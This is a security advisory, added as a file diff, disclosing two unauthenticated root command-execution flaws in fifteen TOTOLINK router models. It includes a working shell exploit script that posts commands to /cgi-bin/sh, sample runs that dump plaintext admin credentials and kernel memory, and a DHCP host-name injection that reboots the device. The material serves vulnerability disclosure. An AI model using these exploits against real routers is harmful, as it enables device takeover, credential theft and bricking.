@@ -1,0 +1,378 @@
+## Advisory Information
+
+Title: 15 TOTOLINK router models vulnerable to multiple RCEs
+Advisory URL: https://pierrekim.github.io/advisories/2015-totolink-0x00.txt
+Blog URL: https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html
+Date published: 2015-07-16
+Vendors contacted: None
+Release mode: 0days, Released
+CVE: no current CVE
+
+
+
+## Product Description
+
+TOTOLINK is a brother brand of ipTime which wins over 80% of SOHO
+markets in South Korea.
+TOTOLINK produces routers routers, wifi access points and network
+devices. Their products are sold worldwide.
+
+
+
+## Vulnerabilities Summary
+
+The first vulnerability allows to bypass the admin authentication and
+to get a direct RCE from the LAN side with a single HTTP request.
+
+The second vulnerability allows to bypass the admin authentication and
+to get a direct RCE from the LAN side with a single DHCP request.
+
+There are direct RCEs against the routers which give a complete root
+access to the embedded Linux from the LAN side.
+
+The two RCEs affect 13 TOTOLINK products from 2009-era firmwares to
+the latest firmwares with the default configuration:
+
+- TOTOLINK A1004 : until last firmware (9.34 - za1004_en_9_34.bin)
+- TOTOLINK A5004NS : until last firmware (9.38 - za5004s_en_9_38.bin)
+- TOTOLINK EX300 : until last firmware (8.68 - TOTOLINK EX300_8_68.bin
+- totolink.net)
+- TOTOLINK EX300 : until last firmware (9.36 -
+ex300_ch_9_36.bin.5357c0 - totolink.cn)
+- TOTOLINK N150RB : until last firmware (9.08 - zn150rb_en_9_08.bin.5357c0)
+- TOTOLINK N300RB : until last firmware (9.26 - zn300rb_en_9_26.bin)
+- TOTOLINK N300RG : until last firmware (8.70 - TOTOLINK N300RG_8_70.bin)
+- TOTOLINK N500RDG : until last firmware (8.42 - TOTOLINK N500RDG_en_8_42.bin)
+- TOTOLINK N600RD : until last firmware (8.64 - TOTOLINK N600RD_en_8_64.bin)
+- TOTOLINK N302R Plus V1 : until the last firmware 8.82 (TOTOLINK
+N302R Plus V1_en_8_82.bin)
+- TOTOLINK N302R Plus V2 : until the last firmware 9.08 (TOTOLINK
+N302R Plus V2_en_9_08.bin)
+- TOTOLINK A3004NS (no firmware available in totolinkusa.com but
+ipTIME's A3004NS model was vulnerable to the 2 RCEs)
+- TOTOLINK EX150 : until the last firmware (8.82 - ex150_ch_8_82.bin.5357c0)
+
+
+The DHCP RCE also affects 2 TOTOLINK products from 2009-era firmwares
+to the latest firmwares with the default configuration:
+
+- TOTOLINK A2004NS : until last firmware (9.60 - za2004s_en_9_60.bin)
+- TOTOLINK EX750 : until last firmware (9.60 - ex750_en_9_60.bin)
+
+
+Firmwares come from totolink.net and from totolink.cn.
+
+- - From my tests, it is possible to use these vulnerabilities to
+overwrite the firmware with a custom (backdoored) firmware.
+
+Concerning the high CVSS score (10/10) of the vulnerabilities and the
+longevity of this vulnerability (6+ year old),
+the TOTOLINK users are urged to contact TOTOLINK.
+
+
+
+## Details - RCE with a single HTTP request
+
+The HTTP server allows the attacker to execute some CGI files.
+
+Many of them are vulnerable to a command inclusion which allows to
+execute commands with the http daemon user rights (root).
+
+
+Exploit code:
+
+$ cat totolink.carnage
+#!/bin/sh
+if [ ! $1 ]; then
+echo "Usage:"
+echo $0 ip command
+exit 1
+fi
+wget -qO- --post-data="echo 'Content-type:
+text/plain';echo;echo;PATH=$PATH:/sbin $2 $3 $4" http://$1/cgi-bin/sh
+
+
+The exploits have been written in HTML/JavaScript, in form of CSRF
+attacks, allowing people to test their systems in live using their
+browsers:
+http://pierrekim.github.io/advisories/
+
+
+o Listing of the filesystem
+
+HTML/JS exploits:
+
+http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-listing.of.the.filesystem.html
+
+Using CLI:
+
+root@kali:~/totolink# ./totolink.carnage 192.168.1.1 ls | head
+ash
+auth
+busybox
+cat
+chmod
+cp
+d.cgi
+date
+echo
+false
+root@kali:~/totolink#
+
+
+o How to retrieve the credentials ? (see login and password at the end
+of the text file)
+
+HTML/JS exploits:
+
+http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-dump.configuration.including.credentials.html
+
+Using CLI:
+
+kali# ./totolink.carnage 192.168.1.1 cat /tmp/etc/iconfig.cfg
+wantype.wan1=dynamic
+dhblock.eth1=0
+ppp_mtu=1454
+fakedns=0
+upnp=1
+ppp_mtu=1454
+timeserver=time.windows.com,gmt22,1,480,0
+wan_ifname=eth1
+auto_dns=1
+dhcp_auto_detect=0
+wireless_ifmode+wlan0=wlan0,0
+dhcpd=0
+lan_ip=192.168.1.1
+lan_netmask=255.255.255.0
+dhcpd_conf=br0,192.168.1.2,192.168.1.253,192.168.1.1,255.255.255.0
+dhcpd_dns=164.124.101.2,168.126.63.2
+dhcpd_opt=7200,30,200,
+dhcpd_configfile=/etc/udhcpd.conf
+dhcpd_lease_file=/etc/udhcpd.leases
+dhcpd_static_lease_file=/etc/udhcpd.static
+use_local_gateway=1
+login=admin
+password=admin
+
+Login and password are stored in plaintext, which is a very bad
+security practice.
+
+
+o Current running process:
+
+HTML/JS exploits:
+
+http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-current.process.html
+
+Using CLI:
+
+kali# ./totolink.carnage 192.168.1.1 ps -auxww
+
+
+o Getting the kernel memory:
+
+HTML/JS exploits:
+
+http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-getting.kernel.memory.html
+
+Using CLI:
+
+kali# ./totolink.carnage 192.168.1.1 cat /proc/kcore
+
+
+o Default firewall rules:
+
+HTML/JS exploits:
+
+http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-default.firewall.rules.html
+
+Using CLI:
+
+kali# ./iptime.carnage.l2.v9.52 192.168.1.1 iptables -nL
+
+
+o Opening the management interface on the WAN:
+
+HTML/JS exploits:
+
+http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-opening.the.firewall.html
+
+
+o Reboot the device:
+
+HTML/JS exploits:
+
+http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-reboot.html
+
+
+o Brick the device:
+
+HTML/JS exploits:
+
+http://pierrekim.github.io/advisories/2015-totolink-0x00-PoC-bricking.the.device.html
+
+
+An attacker can use the /usr/bin/wget binary located in the file
+system of the remote device to plant a backdoor and then execute it as
+root.
+
+By the way, d.cgi in /bin/ is an intentional backdoor.
+
+
+
+## Details - RCE with a single DHCP request
+
+This vulnerability is the exact inverse of CVE-2011-0997. The DHCPD
+server in TOTOLINK devices allows remote attackers to execute
+arbitrary commands
+via shell metacharacters in the host-name field.
+
+Sending a DHCP request with this parameter will reboot the device:
+
+cat /etc/dhcp/dhclient.conf
+
+send host-name ";/sbin/reboot";
+
+When connecting to the UART port (`screen /dev/ttyUSB0 38400`), we
+will see the stdout of the /dev/console device;
+the dhcp request will immediately force the reboot of the remote device:
+
+
+Booting...
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@
+@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
+@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
+@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
+@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
+@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+[...]
+WiFi Simple Config v1.12 (2009.07.31-11:35+0000).
+
+Launch iwcontrol: wlan0
+Reaped 317
+iwcontrol RUN OK
+SIGNAL -> Config Update signal progress
+killall: pppoe-relay: no process killed
+SIGNAL -> WAN ip changed
+WAN0 IP: 192.168.2.1
+signalling START
+Invalid upnpd exit
+killall: upnpd: no process killed
+upnpd Restart 1
+iptables: Bad rule (does a matching rule exist in that chain?)
+Session Garbage Collecting:Maybe system time is updated.( 946684825 0 )
+Update Session timestamp and try it after 5 seconds again.
+ez_ipupdate callback --> time_elapsed: 0
+Run DDNS by IP change:  / 192.168.2.1
+Reaped 352
+iptables: Bad rule (does a matching rule exist in that chain?)
+Jan  1 00:00:25 miniupnpd[370]: Reloading rules from lease file
+Jan  1 00:00:25 miniupnpd[370]: could not open lease file: /var/run/upnp_pmlist
+Jan  1 00:00:25 miniupnpd[370]: HTTP listening on port 2048
+Reaped 363
+Led Silent Callback
+Turn ON All LED
+Dynamic Channel Search for wlan0 is OFF
+start_signal => plantynet_sync
+Do start_signal => plantynet_sync
+SIGNAL -> Config Update signal progress
+killall: pppoe-relay: no process killed
+SIGNAL -> WAN ip changed
+Reaped 354
+iptables: Bad rule (does a matching rule exist in that chain?)
+ez_ipupdate callback --> time_elapsed: 1
+Run DDNS by IP change:  / 192.168.2.1
+Burst DDNS Registration is denied: iptime -> now:26
+Led Silent Callback
+Turn ON All LED
+/proc/sys/net/ipv4/tcp_syn_retries: cannot create
+- - - ---> Plantynet Event : 00000003
+- - - ---> PLANTYNET_SYNC_INTERNET_BLOCK_DEVICE
+
+
+[sending the DHCP request]
+
+
+[01/Jan/2000:00:01:03 +0000] [01/Jan/2000:00:01:03 +0000] Jan  1
+00:01:03 miniupnpd[370]: received signal 15, good-bye
+Reaped 392
+Reaped 318
+Reaped 314
+Reaped 290
+Reaped 288
+Reaped 268
+Reaped 370
+Reaped 367
+- - - ---> PLANTYNET_SYNC_FREE_DEVICE
+Restarting system.
+
+Booting...
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@
+@ chip__no chip__id mfr___id dev___id cap___id size_sft dev_size chipSize
+@ 0000000h 0c84015h 00000c8h 0000040h 0000015h 0000000h 0000015h 0200000h
+@ blk_size blk__cnt sec_size sec__cnt pageSize page_cnt chip_clk chipName
+@ 0010000h 0000020h 0001000h 0000200h 0000100h 0000010h 000004eh GD25Q16
+@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Reboot Result from Watchdog Timeout!
+
+- - - ---RealTek(RTL8196E)at 2012.07.06-04:36+0900 v0.4 [16bit](400MHz)
+Delay 1 second till reset button
+Magic Number: raw_nv 00000000
+Check Firmware(05020000) : size: 0x001ddfc8 ---->
+
+
+[...]
+
+
+An attacker can use the /usr/bin/wget binary located in the file
+system of the remote device to plant a backdoor and then execute it as
+root.
+
+
+
+## Vendor Response
+
+Due to "un-ethical code" found in TOTOLINK products (= backdoors found
+in new TOTOLINK devices), TOTOLINK was not contacted in regard of this
+case, but ipTIME was contacted in April 2015 concerning the first RCE.
+
+
+
+## Report Timeline
+
+* Jun 01, 2014: First RCE found by Pierre Kim and Alexandre Torres in
+ipTIME products.
+* Jun 02, 2014: Second RCE found by Pierre Kim in ipTIME products.
+* Jun 25, 2015: Similar vulnerabilities found in TOTOLINK products.
+* Jul 13, 2015: TOTOLINK silently fixed the HTTP RCE in A2004NS and
+EX750 routers.
+* Jul 13, 2015: Updated firmwares confirmed vulnerable.
+* Jul 16, 2015: A public advisory is sent to security mailing lists.
+
+
+
+## Credit
+
+These vulnerabilities were found by Alexandre Torres and Pierre Kim
+(@PierreKimSec).
+
+
+
+## References
+
+https://pierrekim.github.io/advisories/2015-totolink-0x00.txt
+https://pierrekim.github.io/blog/2015-07-16-15-TOTOLINK-products-vulnerable-to-multiple-RCEs.html
+
+
+
+## Disclaimer
+
+This advisory is licensed under a Creative Commons Attribution Non-Commercial
+Share-Alike 3.0 License: http://creativecommons.org/licenses/by-nc-sa/3.0/
